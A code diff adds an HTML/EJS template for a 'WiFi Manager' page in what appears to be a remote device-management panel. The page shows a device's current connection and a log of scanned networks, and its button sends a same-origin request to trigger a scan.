@@ -1,0 +1,176 @@
+<div class="data-container">
+  <div class="data-controls">
+    <div class="control-bar">
+      <h3><i class="wifi icon"></i> WiFi Manager</h3>
+      <div style="flex: 1;"></div>
+      <button class="btn btn-primary" onclick="refreshWifi()">
+        <i class="refresh icon"></i> Scan WiFi
+      </button>
+    </div>
+  </div>
+
+  <div class="wifi-grid">
+    <!-- Current WiFi -->
+    <div class="wifi-card current">
+      <div class="card-header">
+        <i class="signal icon"></i> Current Connection
+      </div>
+      <div class="card-body">
+        <% if (pageData && pageData.now) { %>
+          <div class="wifi-info-row">
+            <span class="label">SSID:</span>
+            <span class="value"><%= pageData.now.SSID || pageData.now.ssid || 'Unknown' %></span>
+          </div>
+          <div class="wifi-info-row">
+            <span class="label">BSSID:</span>
+            <span class="value"><%= pageData.now.BSSID || pageData.now.bssid || '-' %></span>
+          </div>
+          <div class="wifi-info-row">
+            <span class="label">Signal:</span>
+            <span class="value"><%= pageData.now.rssi || pageData.now.level || '-' %> dBm</span>
+          </div>
+          <div class="wifi-info-row">
+            <span class="label">IP Address:</span>
+            <span class="value"><%= pageData.now.ip || '-' %></span>
+          </div>
+        <% } else { %>
+          <div class="text-center" style="color: #718096; padding: 20px;">
+            Not connected or no data
+          </div>
+        <% } %>
+      </div>
+    </div>
+
+    <!-- WiFi Log / Scanned Networks -->
+    <div class="wifi-card history" style="grid-column: 1 / -1;">
+      <div class="card-header">
+        <i class="list icon"></i> WiFi Networks Log
+      </div>
+      <div class="card-body" style="padding: 0;">
+        <table class="table" style="margin: 0; border: none;">
+          <thead>
+            <tr>
+              <th>SSID</th>
+              <th>BSSID</th>
+              <th>Time</th>
+            </tr>
+          </thead>
+          <tbody>
+            <% if (pageData && pageData.log && pageData.log.length > 0) { %>
+              <% pageData.log.forEach(function(wifi) { %>
+                <tr>
+                  <td style="font-weight: 600;"><%= wifi.SSID || wifi.ssid || 'Hidden' %></td>
+                  <td style="font-family: monospace;"><%= wifi.BSSID || wifi.bssid || '-' %></td>
+                  <td><%= wifi.time ? new Date(wifi.time).toLocaleString() : '-' %></td>
+                </tr>
+              <% }); %>
+            <% } else { %>
+              <tr>
+                <td colspan="3" class="text-center" style="padding: 30px; color: #718096;">
+                  No WiFi logs available
+                </td>
+              </tr>
+            <% } %>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+  .data-container {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  .data-controls {
+    background: white;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+  }
+
+  .control-bar {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+  }
+
+  .wifi-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 24px;
+  }
+
+  .wifi-card {
+    background: white;
+    border-radius: 16px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    overflow: hidden;
+  }
+
+  .wifi-card.current {
+    border-left: 4px solid #48bb78;
+  }
+
+  .card-header {
+    padding: 16px 20px;
+    border-bottom: 1px solid #e2e8f0;
+    font-weight: 700;
+    color: #2d3748;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: #f7fafc;
+  }
+
+  .card-body {
+    padding: 20px;
+  }
+
+  .wifi-info-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 12px;
+    border-bottom: 1px dashed #e2e8f0;
+    padding-bottom: 8px;
+  }
+
+  .wifi-info-row:last-child {
+    border-bottom: none;
+    margin-bottom: 0;
+    padding-bottom: 0;
+  }
+
+  .label {
+    color: #718096;
+    font-size: 14px;
+  }
+
+  .value {
+    color: #2d3748;
+    font-weight: 600;
+  }
+</style>
+
+<script>
+  function refreshWifi() {
+    fetch(`/manage/<%= deviceid %>/0xWI`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({ action: 'scan' }) // Assuming 'scan' or empty object triggers update
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert('WiFi scan requested');
+      setTimeout(() => location.reload(), 2000);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Failed to request WiFi scan');
+    });
+  }
+</script>
